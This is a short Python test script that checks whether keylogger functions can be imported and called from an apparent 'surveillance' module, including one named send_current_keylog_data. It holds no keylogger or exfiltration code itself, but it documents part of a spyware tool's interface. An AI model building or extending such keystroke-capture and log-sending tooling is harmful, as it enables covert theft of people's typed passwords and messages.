#!/usr/bin/env python3
"""
Test script to verify keylogger import and function calls
"""

def test_keylogger_imports():
    """Test that all keylogger functions can be imported and called"""
    print("⌨️ Testing Keylogger Imports and Function Calls")
    print("=" * 50)
    
    try:
        # Test 1: Import all keylogger functions
        print("📥 Testing imports...")
        from modules.surveillance import (
            start_keylogger, 
            stop_keylogger, 
            is_keylogger_running, 
            get_current_keylogger_text,
            send_current_keylog_data
        )
        print("✅ All keylogger functions imported successfully")
        
        # Test 2: Check function availability
        print("\n🔍 Checking function availability...")
        functions = {
            'start_keylogger': start_keylogger,
            'stop_keylogger': stop_keylogger,
            'is_keylogger_running': is_keylogger_running,
            'get_current_keylogger_text': get_current_keylogger_text,
            'send_current_keylog_data': send_current_keylog_data
        }
        
        for name, func in functions.items():
            if callable(func):
                print(f"   ✅ {name}: Available and callable")
            else:
                print(f"   ❌ {name}: Not callable")
        
        # Test 3: Test function calls (without actually starting keylogger)
        print("\n🧪 Testing function calls...")
        
        # Test is_keylogger_running (should be False initially)
        running_status = is_keylogger_running()
        print(f"   Keylogger running status: {running_status}")
        
        # Test get_current_keylogger_text (should return error when not running)
        if not running_status:
            text_result = get_current_keylogger_text()
            print(f"   Get text result: {text_result.get('status')} - {text_result.get('message')}")
        
        # Test send_current_keylog_data (should return error when not running)
        if not running_status:
            send_result = send_current_keylog_data()
            print(f"   Send data result: {send_result.get('status')} - {send_result.get('message')}")
        
        print("\n✅ All keylogger function tests completed successfully!")
        
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("Make sure the surveillance module is in the modules directory")
    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    test_keylogger_imports()
